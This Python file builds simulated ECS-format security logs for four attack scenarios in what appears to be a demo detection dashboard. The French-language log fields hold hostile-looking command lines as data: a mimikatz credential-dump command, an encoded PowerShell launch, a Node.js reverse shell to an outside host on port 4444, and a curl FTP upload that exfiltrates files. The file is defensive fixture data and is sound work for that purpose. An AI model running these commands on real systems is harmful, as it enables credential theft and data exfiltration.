# ---------------------------------------------------------------------------
# Elastic Common Schema (ECS) — Ingestion multi-sources simulée
# Sources : Firewall · Active Directory · EDR · Cloud
# 4 scénarios d'attaque correspondant aux scénarios de mock_data.py
# ---------------------------------------------------------------------------

# ECS field reference: https://www.elastic.co/guide/en/ecs/current/index.html
# Each log entry is a dict whose keys follow ECS naming conventions.
# Additional key "source_type" identifies the originating sensor.

# Severity levels displayed in the UI
SEVERITY_CRITICAL = "critical"
SEVERITY_HIGH = "high"
SEVERITY_MEDIUM = "medium"
SEVERITY_LOW = "low"
SEVERITY_INFO = "info"

# Source type labels
SRC_FIREWALL = "Firewall"
SRC_AD = "Active Directory"
SRC_EDR = "EDR"
SRC_CLOUD = "Cloud"

# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------

def _e(source_type, timestamp, log_level, category, etype, action,
       outcome, message, severity=SEVERITY_INFO, **extra):
    """Build a minimal ECS event dict."""
    entry = {
        "source_type": source_type,
        "@timestamp": timestamp,
        "log.level": log_level,
        "event.kind": "event",
        "event.category": category,
        "event.type": etype,
        "event.action": action,
        "event.outcome": outcome,
        "message": message,
        "_severity": severity,
    }
    entry.update(extra)
    return entry


# ---------------------------------------------------------------------------
# Scénario 0 — Credential Stuffing (Portail Marketing)
# ---------------------------------------------------------------------------
SCENARIO_0_LOGS = [
    # --- Firewall ---
    _e(SRC_FIREWALL, "14:22:48.001", "warning", "network", "connection",
       "firewall-deny", "failure",
       "10 connexions refusées depuis 185.23.14.77 → SRV-WEB:443 (rate-limit)",
       severity=SEVERITY_HIGH,
       **{
           "source.ip": "185.23.14.77", "source.port": 51234,
           "destination.ip": "10.0.1.10", "destination.port": 443,
           "network.protocol": "https", "network.transport": "tcp",
           "network.direction": "inbound",
           "observer.type": "firewall", "observer.name": "FW-01",
           "rule.name": "RATE_LIMIT_HTTPS",
       }),
    _e(SRC_FIREWALL, "14:23:10.342", "warning", "network", "connection",
       "firewall-allow", "success",
       "Connexion autorisée 185.23.14.77 → SRV-WEB:443 (après 43 tentatives)",
       severity=SEVERITY_HIGH,
       **{
           "source.ip": "185.23.14.77", "source.port": 52100,
           "destination.ip": "10.0.1.10", "destination.port": 443,
           "network.protocol": "https", "network.transport": "tcp",
           "network.direction": "inbound",
           "observer.type": "firewall", "observer.name": "FW-01",
           "rule.name": "ALLOW_HTTPS_IN",
       }),
    _e(SRC_FIREWALL, "14:23:55.781", "error", "network", "connection",
       "firewall-deny", "failure",
       "Tentative SSH bloquée 10.0.2.47 → AD-DC:22 (mouvement latéral)",
       severity=SEVERITY_CRITICAL,
       **{
           "source.ip": "10.0.2.47", "source.port": 43210,
           "destination.ip": "10.0.1.50", "destination.port": 22,
           "network.protocol": "ssh", "network.transport": "tcp",
           "network.direction": "internal",
           "observer.type": "firewall", "observer.name": "FW-01",
           "rule.name": "BLOCK_LATERAL_SSH",
       }),
    # --- Active Directory ---
    _e(SRC_AD, "14:22:49.120", "warning", "authentication", "start",
       "authentication-failure", "failure",
       "Échec d'authentification répété : mkt-user01 (tentative 1/43)",
       severity=SEVERITY_MEDIUM,
       **{
           "user.name": "mkt-user01", "user.domain": "corp.local",
           "host.hostname": "SRV-WEB", "host.ip": "10.0.1.10",
           "winlog.event_id": 4625,
           "winlog.logon.type": "Network",
           "source.ip": "185.23.14.77",
       }),
    _e(SRC_AD, "14:23:12.004", "error", "authentication", "start",
       "authentication-success", "success",
       "Authentification réussie : mkt-user01 depuis IP externe suspecte",
       severity=SEVERITY_CRITICAL,
       **{
           "user.name": "mkt-user01", "user.domain": "corp.local",
           "host.hostname": "SRV-WEB", "host.ip": "10.0.1.10",
           "winlog.event_id": 4624,
           "winlog.logon.type": "Network",
           "source.ip": "185.23.14.77",
       }),
    _e(SRC_AD, "14:23:45.889", "error", "iam", "admin",
       "privilege-escalation-attempt", "failure",
       "Tentative d'accès aux partages SYSVOL par mkt-user01 (T1078)",
       severity=SEVERITY_CRITICAL,
       **{
           "user.name": "mkt-user01", "user.domain": "corp.local",
           "host.hostname": "AD-DC", "host.ip": "10.0.1.50",
           "winlog.event_id": 5140,
           "file.path": "\\\\AD-DC\\SYSVOL",
       }),
    # --- EDR ---
    _e(SRC_EDR, "14:23:15.330", "warning", "process", "start",
       "process-create", "success",
       "Processus suspect : cmd.exe lancé depuis w3wp.exe (IIS worker)",
       severity=SEVERITY_HIGH,
       **{
           "host.hostname": "SRV-WEB", "host.ip": "10.0.1.10",
           "process.name": "cmd.exe", "process.pid": 4812,
           "process.parent.name": "w3wp.exe", "process.parent.pid": 3200,
           "process.command_line": "cmd.exe /c whoami",
           "user.name": "mkt-user01",
       }),
    _e(SRC_EDR, "14:23:28.011", "error", "process", "start",
       "credential-dump", "success",
       "Accès mémoire LSASS détecté — possible dumping de credentials (T1003)",
       severity=SEVERITY_CRITICAL,
       **{
           "host.hostname": "WS-MKT-01", "host.ip": "10.0.2.47",
           "process.name": "mimikatz.exe", "process.pid": 5501,
           "process.parent.name": "cmd.exe", "process.parent.pid": 4812,
           "process.command_line": "sekurlsa::logonpasswords",
           "user.name": "mkt-user01",
       }),
    _e(SRC_EDR, "14:23:50.450", "error", "file", "creation",
       "file-exfiltration", "success",
       "Copie de /etc/shadow vers /tmp (leurre Mirage injecté)",
       severity=SEVERITY_CRITICAL,
       **{
           "host.hostname": "SRV-WEB", "host.ip": "10.0.1.10",
           "file.path": "/tmp/passwords.txt",
           "file.size": 412,
           "process.name": "scp", "process.pid": 6021,
           "user.name": "mkt-user01",
           "destination.ip": "185.23.14.77",
       }),
    # --- Cloud ---
    _e(SRC_CLOUD, "14:22:30.000", "info", "network", "info",
       "cloud-traffic-normal", "success",
       "Trafic Cloud AWS normal — aucune anomalie (baseline)",
       severity=SEVERITY_INFO,
       **{
           "cloud.provider": "aws", "cloud.region": "eu-west-1",
           "cloud.service.name": "cloudtrail",
           "user.email": "svc-marketing@corp.com",
           "event.dataset": "aws.cloudtrail",
       }),
    _e(SRC_CLOUD, "14:23:58.200", "warning", "network", "connection",
       "unusual-api-call", "success",
       "Appel API inhabituel : ListBuckets depuis IP 185.23.14.77 (non autorisée)",
       severity=SEVERITY_HIGH,
       **{
           "cloud.provider": "aws", "cloud.region": "eu-west-1",
           "cloud.service.name": "s3",
           "source.ip": "185.23.14.77",
           "user.name": "mkt-user01",
           "event.action": "ListBuckets",
           "event.dataset": "aws.cloudtrail",
       }),
]

# ---------------------------------------------------------------------------
# Scénario 1 — Spear Phishing RH
# ---------------------------------------------------------------------------
SCENARIO_1_LOGS = [
    # --- Firewall ---
    _e(SRC_FIREWALL, "09:17:20.114", "info", "network", "connection",
       "firewall-allow", "success",
       "Connexion SMTP entrante autorisée depuis mail.partner-rh.com",
       severity=SEVERITY_INFO,
       **{
           "source.ip": "91.203.22.14", "source.port": 25,
           "destination.ip": "10.0.1.20", "destination.port": 25,
           "network.protocol": "smtp", "network.transport": "tcp",
           "network.direction": "inbound",
           "observer.type": "firewall", "observer.name": "FW-01",
           "rule.name": "ALLOW_SMTP_IN",
       }),
    _e(SRC_FIREWALL, "09:18:05.553", "error", "network", "connection",
       "firewall-deny", "failure",
       "Connexion sortante suspecte WS-MKT-02 → 185.234.x.x:4444 (C2) bloquée",
       severity=SEVERITY_CRITICAL,
       **{
           "source.ip": "10.0.2.51", "source.port": 49200,
           "destination.ip": "185.234.22.41", "destination.port": 4444,
           "network.protocol": "tcp", "network.transport": "tcp",
           "network.direction": "outbound",
           "observer.type": "firewall", "observer.name": "FW-01",
           "rule.name": "BLOCK_C2_OUTBOUND",
       }),
    _e(SRC_FIREWALL, "09:18:55.009", "error", "network", "connection",
       "firewall-deny", "failure",
       "Accès AD bloqué WS-MKT-02 → AD-DC (isolation déclenchée par AEGIS)",
       severity=SEVERITY_CRITICAL,
       **{
           "source.ip": "10.0.2.51", "source.port": 55210,
           "destination.ip": "10.0.1.50", "destination.port": 445,
           "network.protocol": "smb", "network.transport": "tcp",
           "network.direction": "internal",
           "observer.type": "firewall", "observer.name": "FW-01",
           "rule.name": "AEGIS_ISOLATION",
       }),
    # --- Active Directory ---
    _e(SRC_AD, "09:17:44.080", "warning", "authentication", "start",
       "authentication-success", "success",
       "Connexion rh-admin depuis WS-MKT-02 — heure normale mais source inhabituelle",
       severity=SEVERITY_MEDIUM,
       **{
           "user.name": "rh-admin", "user.domain": "corp.local",
           "host.hostname": "WS-MKT-02", "host.ip": "10.0.2.51",
           "winlog.event_id": 4624,
           "winlog.logon.type": "Interactive",
           "source.ip": "10.0.2.51",
       }),
    _e(SRC_AD, "09:18:02.340", "error", "file", "access",
       "sensitive-file-access", "success",
       "Accès massif aux documents RH sensibles par rh-admin (> 50 fichiers/min)",
       severity=SEVERITY_CRITICAL,
       **{
           "user.name": "rh-admin", "user.domain": "corp.local",
           "host.hostname": "SRV-APP", "host.ip": "10.0.1.20",
           "winlog.event_id": 4663,
           "file.path": "\\\\SRV-APP\\RH\\Confidentiel",
           "file.name": "liste_salaires.pdf",
       }),
    _e(SRC_AD, "09:18:50.770", "error", "iam", "admin",
       "net-use-sysvol", "failure",
       "Tentative net use SYSVOL depuis WS-MKT-02 refusée (isolation active)",
       severity=SEVERITY_CRITICAL,
       **{
           "user.name": "rh-admin", "user.domain": "corp.local",
           "host.hostname": "WS-MKT-02", "host.ip": "10.0.2.51",
           "winlog.event_id": 5145,
           "file.path": "\\\\AD-DC\\SYSVOL",
       }),
    # --- EDR ---
    _e(SRC_EDR, "09:17:46.220", "warning", "process", "start",
       "macro-execution", "success",
       "Macro Office exécutée : WINWORD.EXE → powershell.exe (T1566.001)",
       severity=SEVERITY_HIGH,
       **{
           "host.hostname": "WS-MKT-02", "host.ip": "10.0.2.51",
           "process.name": "powershell.exe", "process.pid": 7812,
           "process.parent.name": "WINWORD.EXE", "process.parent.pid": 5540,
           "process.command_line": "powershell -enc JABj...",
           "user.name": "rh-admin",
       }),
    _e(SRC_EDR, "09:17:59.004", "error", "process", "start",
       "keylogger-detected", "success",
       "Comportement keylogger détecté : SetWindowsHookEx sur WS-MKT-02 (T1056)",
       severity=SEVERITY_CRITICAL,
       **{
           "host.hostname": "WS-MKT-02", "host.ip": "10.0.2.51",
           "process.name": "powershell.exe", "process.pid": 7812,
           "process.parent.name": "WINWORD.EXE", "process.parent.pid": 5540,
           "process.command_line": "Invoke-InputCapture",
           "user.name": "rh-admin",
       }),
    _e(SRC_EDR, "09:18:03.880", "error", "file", "access",
       "data-staged", "success",
       "Fichiers RH encodés base64 et transmis vers 185.234.x.x:4444 (leurres Mirage)",
       severity=SEVERITY_CRITICAL,
       **{
           "host.hostname": "WS-MKT-02", "host.ip": "10.0.2.51",
           "file.path": "/home/rh-admin/Documents/liste_salaires.pdf",
           "file.size": 49152,
           "process.name": "nc.exe", "process.pid": 8100,
           "user.name": "rh-admin",
           "destination.ip": "185.234.22.41", "destination.port": 4444,
       }),
    # --- Cloud ---
    _e(SRC_CLOUD, "09:18:10.000", "warning", "network", "connection",
       "unusual-saas-login", "success",
       "Connexion Microsoft 365 depuis IP non répertoriée : rh-admin@corp.com",
       severity=SEVERITY_HIGH,
       **{
           "cloud.provider": "azure", "cloud.region": "westeurope",
           "cloud.service.name": "microsoft365",
           "source.ip": "185.234.22.41",
           "user.email": "rh-admin@corp.com",
           "event.action": "UserLoginFailed",
           "event.dataset": "azure.activitylogs",
       }),
    _e(SRC_CLOUD, "09:18:48.500", "error", "network", "connection",
       "impossible-travel", "failure",
       "Connexion Impossible Travel détectée : Paris → Moscou en 3 min (rh-admin)",
       severity=SEVERITY_CRITICAL,
       **{
           "cloud.provider": "azure", "cloud.region": "westeurope",
           "cloud.service.name": "entra_id",
           "source.ip": "91.203.22.14",
           "user.email": "rh-admin@corp.com",
           "event.action": "RiskyUserDetected",
           "event.dataset": "azure.activitylogs",
       }),
]

# ---------------------------------------------------------------------------
# Scénario 2 — Supply Chain (npm compromis)
# ---------------------------------------------------------------------------
SCENARIO_2_LOGS = [
    # --- Firewall ---
    _e(SRC_FIREWALL, "02:34:05.118", "info", "network", "connection",
       "firewall-allow", "success",
       "npm install autorisé SRV-APP → registry.npmjs.org:443",
       severity=SEVERITY_INFO,
       **{
           "source.ip": "10.0.1.30", "source.port": 60100,
           "destination.ip": "104.16.1.35", "destination.port": 443,
           "network.protocol": "https", "network.transport": "tcp",
           "network.direction": "outbound",
           "observer.type": "firewall", "observer.name": "FW-01",
           "rule.name": "ALLOW_NPM_REGISTRY",
       }),
    _e(SRC_FIREWALL, "02:34:38.900", "error", "network", "connection",
       "firewall-deny", "failure",
       "Reverse shell bloqué : SRV-APP → 185.234.x.x:4444 (T1059)",
       severity=SEVERITY_CRITICAL,
       **{
           "source.ip": "10.0.1.30", "source.port": 55500,
           "destination.ip": "185.234.22.41", "destination.port": 4444,
           "network.protocol": "tcp", "network.transport": "tcp",
           "network.direction": "outbound",
           "observer.type": "firewall", "observer.name": "FW-01",
           "rule.name": "BLOCK_REVERSE_SHELL",
       }),
    _e(SRC_FIREWALL, "02:35:10.220", "error", "network", "connection",
       "firewall-deny", "failure",
       "Tentative connexion DB bloquée SRV-APP → SRV-DB:5432 (isolation AEGIS)",
       severity=SEVERITY_CRITICAL,
       **{
           "source.ip": "10.0.1.30", "source.port": 44100,
           "destination.ip": "10.0.1.40", "destination.port": 5432,
           "network.protocol": "postgresql", "network.transport": "tcp",
           "network.direction": "internal",
           "observer.type": "firewall", "observer.name": "FW-01",
           "rule.name": "AEGIS_ISOLATION",
       }),
    # --- Active Directory ---
    _e(SRC_AD, "02:34:07.005", "info", "authentication", "start",
       "service-account-logon", "success",
       "Connexion service account ci-runner sur SRV-APP (build CI/CD nocturne)",
       severity=SEVERITY_INFO,
       **{
           "user.name": "ci-runner", "user.domain": "corp.local",
           "host.hostname": "SRV-APP", "host.ip": "10.0.1.30",
           "winlog.event_id": 4624,
           "winlog.logon.type": "Service",
           "source.ip": "10.0.1.30",
       }),
    _e(SRC_AD, "02:34:40.112", "error", "iam", "admin",
       "service-account-privilege-abuse", "success",
       "ci-runner tente d'écrire dans /etc/cron.d (T1543 — persistence)",
       severity=SEVERITY_CRITICAL,
       **{
           "user.name": "ci-runner", "user.domain": "corp.local",
           "host.hostname": "SRV-APP", "host.ip": "10.0.1.30",
           "winlog.event_id": 4670,
           "file.path": "/etc/cron.d/update-checker",
       }),
    _e(SRC_AD, "02:35:05.441", "warning", "authentication", "end",
       "service-account-locked", "success",
       "Compte ci-runner verrouillé par AEGIS — activité anormale détectée",
       severity=SEVERITY_HIGH,
       **{
           "user.name": "ci-runner", "user.domain": "corp.local",
           "host.hostname": "AD-DC", "host.ip": "10.0.1.50",
           "winlog.event_id": 4725,
           "source.ip": "10.0.1.30",
       }),
    # --- EDR ---
    _e(SRC_EDR, "02:34:10.780", "warning", "process", "start",
       "suspicious-postinstall", "success",
       "Script postinstall suspect détecté dans @corp/utils@3.2.1 (npm)",
       severity=SEVERITY_HIGH,
       **{
           "host.hostname": "SRV-APP", "host.ip": "10.0.1.30",
           "process.name": "node", "process.pid": 3412,
           "process.parent.name": "npm", "process.parent.pid": 3100,
           "process.command_line": "node /tmp/.cache/update-checker.js",
           "user.name": "ci-runner",
       }),
    _e(SRC_EDR, "02:34:38.005", "error", "process", "start",
       "reverse-shell-detected", "success",
       "Reverse shell Node.js détecté : connexion sortante vers 185.234.x.x:4444 (T1059)",
       severity=SEVERITY_CRITICAL,
       **{
           "host.hostname": "SRV-APP", "host.ip": "10.0.1.30",
           "process.name": "node", "process.pid": 3412,
           "process.parent.name": "npm", "process.parent.pid": 3100,
           "process.command_line": "net.connect(4444,'185.234.x.x',...)",
           "user.name": "ci-runner",
           "destination.ip": "185.234.22.41", "destination.port": 4444,
       }),
    _e(SRC_EDR, "02:34:55.330", "error", "process", "start",
       "db-exfiltration-attempt", "success",
       "Requête DB anormale : SELECT * FROM users (données leurres injectées par Mirage)",
       severity=SEVERITY_CRITICAL,
       **{
           "host.hostname": "SRV-APP", "host.ip": "10.0.1.30",
           "process.name": "psql", "process.pid": 4901,
           "process.parent.name": "node", "process.parent.pid": 3412,
           "process.command_line": "psql -h SRV-DB -U ci_user -c 'SELECT * FROM users'",
           "user.name": "ci-runner",
       }),
    # --- Cloud ---
    _e(SRC_CLOUD, "02:33:50.000", "info", "network", "info",
       "ecr-image-pull", "success",
       "Pull image Docker depuis AWS ECR — pipeline CI/CD autorisé",
       severity=SEVERITY_INFO,
       **{
           "cloud.provider": "aws", "cloud.region": "eu-west-1",
           "cloud.service.name": "ecr",
           "user.name": "ci-runner",
           "event.action": "GetDownloadUrlForLayer",
           "event.dataset": "aws.cloudtrail",
       }),
    _e(SRC_CLOUD, "02:34:42.800", "error", "network", "connection",
       "s3-exfiltration-attempt", "failure",
       "Tentative d'accès S3 non autorisée depuis SRV-APP (T1048 bloqué)",
       severity=SEVERITY_CRITICAL,
       **{
           "cloud.provider": "aws", "cloud.region": "eu-west-1",
           "cloud.service.name": "s3",
           "source.ip": "10.0.1.30",
           "user.name": "ci-runner",
           "event.action": "PutObject",
           "event.dataset": "aws.cloudtrail",
       }),
]

# ---------------------------------------------------------------------------
# Scénario 3 — Insider Threat (exfiltration lente)
# ---------------------------------------------------------------------------
SCENARIO_3_LOGS = [
    # --- Firewall ---
    _e(SRC_FIREWALL, "23:45:20.001", "info", "network", "connection",
       "firewall-allow", "success",
       "Connexion autorisée WS-DEV → SRV-FILES:445 (accès fichiers habituel)",
       severity=SEVERITY_INFO,
       **{
           "source.ip": "10.0.3.85", "source.port": 62100,
           "destination.ip": "10.0.1.60", "destination.port": 445,
           "network.protocol": "smb", "network.transport": "tcp",
           "network.direction": "internal",
           "observer.type": "firewall", "observer.name": "FW-01",
           "rule.name": "ALLOW_SMB_INTERNAL",
       }),
    _e(SRC_FIREWALL, "23:47:10.445", "error", "network", "connection",
       "high-volume-transfer", "success",
       "Volume de transfert anormal : WS-DEV → SRV-FILES (1.4 GB en 3 min)",
       severity=SEVERITY_HIGH,
       **{
           "source.ip": "10.0.3.85", "source.port": 62100,
           "destination.ip": "10.0.1.60", "destination.port": 445,
           "network.bytes": 1503238553,
           "network.protocol": "smb", "network.transport": "tcp",
           "network.direction": "internal",
           "observer.type": "firewall", "observer.name": "FW-01",
           "rule.name": "ANOMALY_LARGE_TRANSFER",
       }),
    _e(SRC_FIREWALL, "23:48:05.880", "error", "network", "connection",
       "firewall-deny", "failure",
       "Exfiltration FTP bloquée : WS-DEV → 192.168.x.x:21 (isolation AEGIS)",
       severity=SEVERITY_CRITICAL,
       **{
           "source.ip": "10.0.3.85", "source.port": 55010,
           "destination.ip": "192.168.100.55", "destination.port": 21,
           "network.protocol": "ftp", "network.transport": "tcp",
           "network.direction": "outbound",
           "observer.type": "firewall", "observer.name": "FW-01",
           "rule.name": "AEGIS_ISOLATION",
       }),
    # --- Active Directory ---
    _e(SRC_AD, "23:45:31.200", "warning", "authentication", "start",
       "off-hours-logon", "success",
       "Connexion hors-heures (23h45) : dev-user03 depuis WS-DEV (UEBA alerte)",
       severity=SEVERITY_HIGH,
       **{
           "user.name": "dev-user03", "user.domain": "corp.local",
           "host.hostname": "WS-DEV", "host.ip": "10.0.3.85",
           "winlog.event_id": 4624,
           "winlog.logon.type": "Interactive",
           "source.ip": "10.0.3.85",
       }),
    _e(SRC_AD, "23:45:55.009", "error", "file", "access",
       "bulk-file-access", "success",
       "Accès en masse : dev-user03 ouvre 312 fichiers Confidentiel/ en 90 s (T1083)",
       severity=SEVERITY_CRITICAL,
       **{
           "user.name": "dev-user03", "user.domain": "corp.local",
           "host.hostname": "SRV-FILES", "host.ip": "10.0.1.60",
           "winlog.event_id": 4663,
           "file.path": "\\\\SRV-FILES\\Confidentiel\\",
           "file.name": "budget_2026_Q1.xlsx",
       }),
    _e(SRC_AD, "23:48:01.550", "error", "iam", "admin",
       "account-disabled", "success",
       "Compte dev-user03 désactivé par AEGIS — exfiltration interne confirmée",
       severity=SEVERITY_CRITICAL,
       **{
           "user.name": "dev-user03", "user.domain": "corp.local",
           "host.hostname": "AD-DC", "host.ip": "10.0.1.50",
           "winlog.event_id": 4725,
           "source.ip": "10.0.3.85",
       }),
    # --- EDR ---
    _e(SRC_EDR, "23:45:33.440", "warning", "file", "access",
       "bulk-copy-start", "success",
       "Copie massive détectée : cp -r Confidentiel/ /tmp/exfil/ (1.4 GB, T1005)",
       severity=SEVERITY_HIGH,
       **{
           "host.hostname": "WS-DEV", "host.ip": "10.0.3.85",
           "process.name": "cp", "process.pid": 9210,
           "process.parent.name": "bash", "process.parent.pid": 8900,
           "process.command_line": "cp -r /mnt/SRV-FILES/Confidentiel/budget_2026/ /tmp/exfil/",
           "user.name": "dev-user03",
           "file.path": "/tmp/exfil/",
       }),
    _e(SRC_EDR, "23:47:30.110", "error", "network", "connection",
       "ftp-upload-attempt", "success",
       "curl FTP upload /tmp/exfil/ → 192.168.x.x (données leurres tracées par Mirage)",
       severity=SEVERITY_CRITICAL,
       **{
           "host.hostname": "WS-DEV", "host.ip": "10.0.3.85",
           "process.name": "curl", "process.pid": 9800,
           "process.parent.name": "bash", "process.parent.pid": 8900,
           "process.command_line": "curl -T /tmp/exfil/ ftp://192.168.x.x/upload/",
           "user.name": "dev-user03",
           "destination.ip": "192.168.100.55", "destination.port": 21,
       }),
    _e(SRC_EDR, "23:48:02.005", "warning", "process", "end",
       "process-terminated", "success",
       "Processus curl terminé — connexion FTP refusée (isolation réseau active)",
       severity=SEVERITY_MEDIUM,
       **{
           "host.hostname": "WS-DEV", "host.ip": "10.0.3.85",
           "process.name": "curl", "process.pid": 9800,
           "process.exit_code": 1,
           "user.name": "dev-user03",
       }),
    # --- Cloud ---
    _e(SRC_CLOUD, "23:44:00.000", "info", "network", "info",
       "cloud-traffic-normal", "success",
       "Activité Cloud GCP normale — aucune anomalie détectée (baseline)",
       severity=SEVERITY_INFO,
       **{
           "cloud.provider": "gcp", "cloud.region": "europe-west1",
           "cloud.service.name": "cloud_audit_logs",
           "user.email": "dev-user03@corp.com",
           "event.dataset": "gcp.audit",
       }),
    _e(SRC_CLOUD, "23:47:55.700", "warning", "network", "connection",
       "unusual-storage-upload", "failure",
       "Tentative d'upload GCS depuis IP privée 10.0.3.85 refusée (VPC rule)",
       severity=SEVERITY_HIGH,
       **{
           "cloud.provider": "gcp", "cloud.region": "europe-west1",
           "cloud.service.name": "cloud_storage",
           "source.ip": "10.0.3.85",
           "user.email": "dev-user03@corp.com",
           "event.action": "storage.objects.create",
           "event.dataset": "gcp.audit",
       }),
]

# ---------------------------------------------------------------------------
# Master index: scenario index → logs list
# ---------------------------------------------------------------------------
ECS_LOGS_BY_SCENARIO = [
    SCENARIO_0_LOGS,
    SCENARIO_1_LOGS,
    SCENARIO_2_LOGS,
    SCENARIO_3_LOGS,
]

# Source metadata
SOURCE_META = {
    SRC_FIREWALL: {
        "icon": "🔥",
        "color_class": "src-firewall",
        "label": "Firewall",
        "description": "Palo Alto FW-01 — Périmètre Nord-Sud & Est-Ouest",
    },
    SRC_AD: {
        "icon": "🗄️",
        "color_class": "src-ad",
        "label": "Active Directory",
        "description": "Windows Server AD-DC — Authentification & IAM",
    },
    SRC_EDR: {
        "icon": "🛡️",
        "color_class": "src-edr",
        "label": "EDR",
        "description": "CrowdStrike Falcon — Détection endpoint & comportement",
    },
    SRC_CLOUD: {
        "icon": "☁️",
        "color_class": "src-cloud",
        "label": "Cloud",
        "description": "AWS CloudTrail / Azure Logs / GCP Audit",
    },
}
